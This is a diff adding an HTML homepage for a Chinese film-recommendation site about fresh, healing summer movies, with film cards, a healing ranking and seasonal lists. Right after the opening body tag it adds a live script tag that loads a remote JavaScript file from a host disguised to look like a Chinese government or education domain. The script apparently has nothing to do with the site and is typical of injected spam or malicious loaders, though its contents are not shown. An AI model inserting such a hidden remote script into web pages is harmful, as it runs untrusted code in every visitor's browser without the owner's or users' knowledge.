@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>夏沫电影网 - 清新·治愈·夏日片单</title>
+<meta name="description" content="夏沫电影网(xiamodianyingwang-h5)主打清新、治愈、青春、夏日主题电影推荐与片单整理，移动端自适应，必应收录友好。">
+<meta name="keywords" content="夏沫电影网, xiamodianyingwang-h5, 清新电影, 治愈片单, 青春电影, 夏日电影">
+<meta name="author" content="夏沫电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://xiamodianyingwang-h5.github.io/">
+
+<style>
+:root{
+  --sky:#e8f4f8;
+  --ocean:#b3dff0;
+  --deep:#5bc0d6;
+  --foam:#ffffff;
+  --sand:#fef9f0;
+  --coral:#ff8a7a;
+  --sun:#ffc857;
+  --text:#2c5f6f;
+  --muted:#7eb4c5;
+  --line:rgba(91,192,214,.2);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Noto Sans CJK SC",sans-serif;
+  background:linear-gradient(180deg,var(--sky) 0%,#d6eef7 40%,var(--sand) 100%);
+  color:var(--text);
+  line-height:1.7;
+  min-height:100vh;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 顶部气泡条 */
+.bubble-bar{
+  background:linear-gradient(90deg,var(--deep),#7ec8d6);
+  color:#fff;
+  text-align:center;
+  padding:6px 10px;
+  font-size:11px;
+  letter-spacing:1px;
+}
+
+/* 头部 */
+.header{
+  max-width:1100px;
+  margin:0 auto;
+  padding:24px 20px 16px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:16px;
+  flex-wrap:wrap;
+}
+.logo{
+  display:flex;
+  align-items:center;
+  gap:14px;
+}
+.logo-bubble{
+  width:54px;height:54px;
+  background:linear-gradient(135deg,var(--deep),var(--coral));
+  border-radius:50% 50% 50% 20%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:26px;
+  box-shadow:0 4px 14px rgba(91,192,214,.35);
+}
+.logo h1{
+  font-size:24px;
+  font-weight:800;
+  color:var(--text);
+  letter-spacing:2px;
+}
+.logo .sub{
+  font-size:11px;
+  color:var(--muted);
+  font-family:Arial,sans-serif;
+}
+.header-search{
+  flex:1;max-width:280px;
+}
+.header-search form{
+  display:flex;height:38px;
+  background:#fff;border-radius:19px;
+  box-shadow:0 2px 10px rgba(91,192,214,.15);
+  overflow:hidden;
+}
+.header-search input{
+  flex:1;border:none;outline:none;
+  padding:0 16px;font-size:13px;
+}
+.header-search button{
+  padding:0 18px;background:var(--deep);
+  color:#fff;border:none;font-size:13px;cursor:pointer;
+}
+
+/* 导航气泡 */
+.nav-cloud{
+  max-width:1100px;margin:0 auto 20px;
+  padding:0 20px;
+  display:flex;gap:10px;flex-wrap:wrap;
+}
+.nav-cloud a{
+  padding:8px 18px;
+  background:#fff;
+  border-radius:20px;
+  font-size:13px;
+  color:var(--text);
+  box-shadow:0 2px 8px rgba(91,192,214,.12);
+  transition:all .25s;
+}
+.nav-cloud a:hover{
+  background:var(--deep);color:#fff;
+  transform:translateY(-2px);
+  box-shadow:0 4px 14px rgba(91,192,214,.3);
+}
+
+/* 主区 */
+.main{
+  max-width:1100px;margin:0 auto;
+  padding:0 20px 30px;
+}
+
+/* 英雄：波浪横幅 */
+.wave-banner{
+  background:linear-gradient(135deg,var(--deep),#a8dce8);
+  border-radius:20px;
+  padding:28px 26px;
+  color:#fff;
+  position:relative;
+  overflow:hidden;
+  margin-bottom:26px;
+}
+.wave-banner::after{
+  content:"🌊";
+  position:absolute;
+  right:20px;bottom:-10px;
+  font-size:100px;
+  opacity:.2;
+}
+.wave-banner h2{font-size:26px;margin-bottom:8px;font-weight:800}
+.wave-banner p{font-size:14px;opacity:.9;max-width:520px}
+.wave-banner .bubbles{
+  margin-top:14px;display:flex;gap:8px;flex-wrap:wrap;
+}
+.wave-banner .bubbles span{
+  padding:4px 14px;
+  background:rgba(255,255,255,.25);
+  border-radius:20px;font-size:12px;
+}
+
+/* 栏目通用 */
+.section{margin-bottom:30px}
+.section-head{
+  display:flex;align-items:center;gap:10px;
+  margin-bottom:16px;
+}
+.section-head .icon{
+  width:32px;height:32px;
+  background:var(--foam);
+  border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:16px;
+  box-shadow:0 2px 6px rgba(91,192,214,.15);
+}
+.section-head h3{font-size:18px;color:var(--text)}
+.section-head .more{
+  margin-left:auto;font-size:12px;color:var(--deep);
+  font-family:Arial,sans-serif;
+}
+
+/* 栏目一：夏日片单（圆角卡片网格） */
+.summer-grid{
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:16px;
+}
+.summer-card{
+  background:#fff;
+  border-radius:16px;
+  padding:18px;
+  box-shadow:0 4px 14px rgba(91,192,214,.1);
+  transition:transform .25s;
+  position:relative;
+}
+.summer-card:hover{transform:translateY(-4px)}
+.summer-card .emoji{
+  font-size:36px;margin-bottom:10px;
+}
+.summer-card h4{font-size:15px;margin-bottom:4px;color:var(--text)}
+.summer-card .info{font-size:12px;color:var(--muted);margin-bottom:8px;font-family:Arial,sans-serif}
+.summer-card .desc{font-size:12px;color:#555;line-height:1.6}
+.summer-card .tag-row{
+  margin-top:10px;display:flex;gap:6px;flex-wrap:wrap;
+}
+.summer-card .tag-row span{
+  padding:2px 10px;background:var(--sky);
+  border-radius:10px;font-size:11px;color:var(--deep);
+}
+
+/* 栏目二：治愈指数（半圆进度） */
+.healing-list{
+  display:grid;
+  grid-template-columns:repeat(2,1fr);
+  gap:14px;
+}
+.heal-card{
+  background:#fff;
+  border-radius:14px;
+  padding:16px;
+  box-shadow:0 3px 10px rgba(91,192,214,.1);
+  display:flex;align-items:center;gap:14px;
+}
+.heal-circle{
+  width:64px;height:64px;
+  border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:18px;font-weight:800;color:var(--deep);
+  flex-shrink:0;
+  position:relative;
+}
+.heal-circle::before{
+  content:"";position:absolute;inset:4px;
+  border-radius:50%;
+  border:3px solid var(--line);
+  border-top-color:var(--deep);
+}
+.heal-info{flex:1}
+.heal-info h4{font-size:14px;margin-bottom:2px}
+.heal-info p{font-size:11px;color:var(--muted)}
+.heal-info .stars{font-size:12px;margin-top:2px}
+
+/* 栏目三：季节轮播（横向滚动） */
+.season-scroll{
+  display:flex;gap:14px;
+  overflow-x:auto;
+  padding-bottom:10px;
+  scroll-snap-type:x mandatory;
+}
+.season-card{
+  scroll-snap-align:start;
+  flex:0 0 220px;
+  background:#fff;
+  border-radius:16px 16px 4px 4px;
+  overflow:hidden;
+  box-shadow:0 3px 12px rgba(91,192,214,.12);
+}
+.season-card .season-top{
+  height:80px;display:flex;align-items:center;justify-content:center;
+  font-size:40px;
+}
+.season-card:nth-child(1) .season-top{background:linear-gradient(135deg,#ffc857,#ff8a7a)}
+.season-card:nth-child(2) .season-top{background:linear-gradient(135deg,#5bc0d6,#a8dce8)}
+.season-card:nth-child(3) .season-top{background:linear-gradient(135deg,#a8d57d,#c5e1a5)}
+.season-card:nth-child(4) .season-top{background:linear-gradient(135deg,#b39ddb,#d1c4e9)}
+.season-card:nth-child(5) .season-top{background:linear-gradient(135deg,#ffab91,#ffccbc)}
+.season-card .season-body{padding:12px}
+.season-card h4{font-size:14px;margin-bottom:4px}
+.season-card p{font-size:11px;color:var(--muted);line-height:1.5}
+
+/* 栏目四：关于 */
+.about-card{
+  background:#fff;
+  border-radius:16px;
+  padding:24px;
+  box-shadow:0 4px 14px rgba(91,192,214,.1);
+  display:flex;gap:20px;align-items:center;flex-wrap:wrap;
+}
+.about-card .about-emoji{font-size:48px}
+.about-card h3{font-size:17px;margin-bottom:6px}
+.about-card p{font-size:13px;color:#555;max-width:560px}
+.about-card .url{
+  margin-top:8px;font-size:12px;color:var(--deep);
+  font-family:Arial,sans-serif;
+}
+
+/* 页脚 */
+.footer{
+  margin-top:30px;
+  background:linear-gradient(135deg,var(--text),#1a4555);
+  color:rgba(255,255,255,.7);
+  padding:28px 20px 36px;
+  text-align:center;
+}
+.footer-inner{max-width:1100px;margin:0 auto}
+.footer p{font-size:12px;margin-bottom:4px}
+.footer a{color:var(--ocean)}
+.footer .footer-nav{
+  margin-top:14px;display:flex;justify-content:center;gap:16px;flex-wrap:wrap;
+}
+.footer .footer-nav a{font-size:12px;color:rgba(255,255,255,.6)}
+.footer .footer-nav a:hover{color:#fff}
+
+/* 移动端 */
+@media(max-width:860px){
+  .summer-grid{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:640px){
+  .header{padding:16px 16px 12px}
+  .logo-bubble{width:44px;height:44px;font-size:22px}
+  .logo h1{font-size:19px}
+  .header-search{display:none}
+  .nav-cloud{padding:0 16px;gap:8px}
+  .nav-cloud a{padding:6px 14px;font-size:12px}
+  .main{padding:0 16px 24px}
+  .wave-banner{padding:20px 16px;border-radius:14px}
+  .wave-banner h2{font-size:21px}
+  .summer-grid{grid-template-columns:1fr}
+  .healing-list{grid-template-columns:1fr}
+  .season-card{flex-basis:78%}
+  .about-card{padding:18px 14px}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="bubble-bar">🫧 夏沫电影网 · 清新治愈夏日片单 · 移动端自适应 · 必应收录友好</div>
+
+<header class="header">
+  <div class="logo">
+    <div class="logo-bubble">🌊</div>
+    <div>
+      <h1>夏沫电影网</h1>
+      <div class="sub">xiamodianyingwang-h5 · 清新治愈系</div>
+    </div>
+  </div>
+  <div class="header-search">
+    <form action="#" method="get">
+      <input type="text" name="q" placeholder="搜索清新/治愈/夏日电影...">
+      <button type="submit">🔍</button>
+    </form>
+  </div>
+</header>
+
+<nav class="nav-cloud">
+  <a href="#">🌸 清新治愈</a>
+  <a href="#">🌊 夏日海边</a>
+  <a href="#">🎓 青春校园</a>
+  <a href="#">🍃 文艺独立</a>
+  <a href="#">🌈 暖心家庭</a>
+  <a href="#">🎨 动画治愈</a>
+  <a href="#">🎵 音乐梦想</a>
+  <a href="#">📝 关于我们</a>
+</nav>
+
+<div class="main">
+
+  <!-- 英雄横幅 -->
+  <section class="wave-banner">
+    <h2>夏日的泡沫，像电影一样轻盈</h2>
+    <p>夏沫电影网只收那些让你心里泛起涟漪的片子——海边、单车、蝉鸣、毕业季、初恋、一封没寄出的信。治愈系片单，给疲惫的你一个喘息的午后。</p>
+    <div class="bubbles">
+      <span>🌊 海边电影</span>
+      <span>🌸 治愈系</span>
+      <span>🎓 青春校园</span>
+      <span>🍃 清新文艺</span>
+    </div>
+  </section>
+
+  <!-- 栏目一：夏日片单 -->
+  <section class="section" id="summer">
+    <div class="section-head">
+      <span class="icon">🏖️</span>
+      <h3>夏日精选片单</h3>
+      <a class="more" href="#">全部 #</a>
+    </div>
+    <div class="summer-grid">
+      <article class="summer-card">
+        <div class="emoji">🌊</div>
+        <h4>《海街日记》</h4>
+        <div class="info">2015 · 是枝裕和 · 日本</div>
+        <p class="desc">镰仓的海风、梅子酒、四姐妹的日常。夏天就应该这样慢下来。</p>
+        <div class="tag-row"><span>海边</span><span>家庭</span><span>日常</span></div>
+      </article>
+      <article class="summer-card">
+        <div class="emoji">🎓</div>
+        <h4>《蓝色大门》</h4>
+        <div class="info">2002 · 易智言 · 台湾</div>
+        <p class="desc">游泳池、单车、十七岁的夏天。关于喜欢一个人是什么感觉。</p>
+        <div class="tag-row"><span>青春</span><span>初恋</span><span>台湾</span></div>
+      </article>
+      <article class="summer-card">
+        <div class="emoji">🏄</div>
+        <h4>《少年派的奇幻漂流》</h4>
+        <div class="info">2012 · 李安 · 美国/台湾</div>
+        <p class="desc">太平洋上的日落、飞鱼、荧光海。夏天和海洋的终极浪漫。</p>
+        <div class="tag-row"><span>海洋</span><span>奇幻</span><span>视觉</span></div>
+      </article>
+      <article class="summer-card">
+        <div class="emoji">🍦</div>
+        <h4>《菊次郎的夏天》</h4>
+        <div class="info">1999 · 北野武 · 日本</div>
+        <p class="desc">暑假、公路、大叔和小男孩。久石让的音乐一响，夏天就来了。</p>
+        <div class="tag-row"><span>暑假</span><span>公路</span><span>久石让</span></div>
+      </article>
+      <article class="summer-card">
+        <div class="emoji">📝</div>
+        <h4>《情书》</h4>
+        <div class="info">1995 · 岩井俊二 · 日本</div>
+        <p class="desc">小樽的雪、图书馆的窗帘、那句"你好吗？我很好。"</p>
+        <div class="tag-row"><span>书信</span><span>暗恋</span><span>经典</span></div>
+      </article>
+      <article class="summer-card">
+        <div class="emoji">🌻</div>
+        <h4>《小森林》</h4>
+        <div class="info">2014 · 森淳一 · 日本</div>
+        <p class="desc">夏天的西红柿、雨后的野菜、自己种的米饭。治愈系天花板。</p>
+        <div class="tag-row"><span>美食</span><span>乡村</span><span>独居</span></div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二：治愈指数 -->
+  <section class="section" id="healing">
+    <div class="section-head">
+      <span class="icon">💚</span>
+      <h3>治愈指数排行</h3>
+      <a class="more" href="#">完整排行 #</a>
+    </div>
+    <div class="healing-list">
+      <div class="heal-card">
+        <div class="heal-circle">98</div>
+        <div class="heal-info">
+          <h4>《千与千寻》</h4>
+          <p>宫崎骏 · 2001</p>
+          <div class="stars">★★★★★</div>
+        </div>
+      </div>
+      <div class="heal-card">
+        <div class="heal-circle">96</div>
+        <div class="heal-info">
+          <h4>《龙猫》</h4>
+          <p>宫崎骏 · 1988</p>
+          <div class="stars">★★★★★</div>
+        </div>
+      </div>
+      <div class="heal-card">
+        <div class="heal-circle">94</div>
+        <div class="heal-info">
+          <h4>《你的名字。》</h4>
+          <p>新海诚 · 2016</p>
+          <div class="stars">★★★★☆</div>
+        </div>
+      </div>
+      <div class="heal-card">
+        <div class="heal-circle">92</div>
+        <div class="heal-info">
+          <h4>《入殓师》</h4>
+          <p>泷田洋二郎 · 2008</p>
+          <div class="stars">★★★★☆</div>
+        </div>
+      </div>
+      <div class="heal-card">
+        <div class="heal-circle">90</div>
+        <div class="heal-info">
+          <h4>《小鞋子》</h4>
+          <p>马基德·马基迪 · 1997</p>
+          <div class="stars">★★★★☆</div>
+        </div>
+      </div>
+      <div class="heal-card">
+        <div class="heal-circle">88</div>
+        <div class="heal-info">
+          <h4>《天使爱美丽》</h4>
+          <p>让-皮埃尔·热内 · 2001</p>
+          <div class="stars">★★★★☆</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三：季节主题 -->
+  <section class="section" id="seasons">
+    <div class="section-head">
+      <span class="icon">🗓️</span>
+      <h3>按季节看电影</h3>
+      <a class="more" href="#">更多 #</a>
+    </div>
+    <div class="season-scroll">
+      <div class="season-card">
+        <div class="season-top">🌸</div>
+        <div class="season-body">
+          <h4>春 · 新生</h4>
+          <p>《小森林 春夏篇》《花样年华》《立春》</p>
+        </div>
+      </div>
+      <div class="season-card">
+        <div class="season-top">🌊</div>
+        <div class="season-body">
+          <h4>夏 · 热烈</h4>
+          <p>《海街日记》《蓝色大门》《菊次郎的夏天》</p>
+        </div>
+      </div>
+      <div class="season-card">
+        <div class="season-top">🍂</div>
+        <div class="season-body">
+          <h4>秋 · 思念</h4>
+          <p>《秋天的童话》《当哈利遇到莎莉》《入殓师》</p>
+        </div>
+      </div>
+      <div class="season-card">
+        <div class="season-top">❄️</div>
+        <div class="season-body">
+          <h4>冬 · 温暖</h4>
+          <p>《小森林 秋冬篇》《真爱至上》《情书》</p>
+        </div>
+      </div>
+      <div class="season-card">
+        <div class="season-top">🌈</div>
+        <div class="season-body">
+          <h4>全年 · 治愈</h4>
+          <p>《千与千寻》《龙猫》《天使爱美丽》</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：关于 -->
+  <section class="section" id="about">
+    <div class="section-head">
+      <span class="icon">🫧</span>
+      <h3>关于夏沫电影网</h3>
+    </div>
+    <div class="about-card">
+      <div class="about-emoji">🌊</div>
+      <div>
+        <h3>一个关于夏天的电影网站</h3>
+        <p>夏沫电影网（xiamodianyingwang-h5）是一个专注于清新、治愈、青春、夏日主题的电影推荐站。我们相信好电影像夏日的泡沫一样——轻盈、透明、转瞬即逝，但那一瞬间的美好值得被记住。</p>
+        <div class="url">https://xiamodianyingwang-h5.github.io</div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <div class="footer-inner">
+    <p>© 2026 夏沫电影网 | xiamodianyingwang-h5</p>
+    <p>永久地址：<a href="https://xiamodianyingwang-h5.github.io">https://xiamodianyingwang-h5.github.io</a></p>
+    <p>本站为清新/治愈电影推荐与片单整理站，仅供交流分享，不提供盗版资源下载。</p>
+    <div class="footer-nav">
+      <a href="#">首页</a>
+      <a href="#">片单</a>
+      <a href="#">分类</a>
+      <a href="#">排行</a>
+      <a href="#">关于</a>
+      <a href="#">联系</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
